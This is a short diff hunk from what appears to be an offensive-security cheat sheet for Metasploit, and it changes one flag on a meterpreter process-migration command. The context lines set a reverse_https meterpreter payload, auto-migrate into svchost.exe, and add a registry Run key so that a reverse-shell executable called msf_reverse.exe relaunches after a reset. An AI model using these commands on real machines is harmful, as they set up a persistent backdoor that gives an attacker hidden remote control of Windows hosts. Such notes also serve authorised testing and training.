@@ -1019,7 +1019,7 @@ set payload windows/x64.meterpreter/reverse_https
 ##### Migrate
 ```bash
 set AutoRunScript post/windows/manage/migrate
-set AutoRunScript migrate -n svchost.exe
+set AutoRunScript migrate -N svchost.exe
 svchost.exe
 RUN THE BACKDOOR AFTER RESET
 meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_reverse.exe"' -v msf_reverse
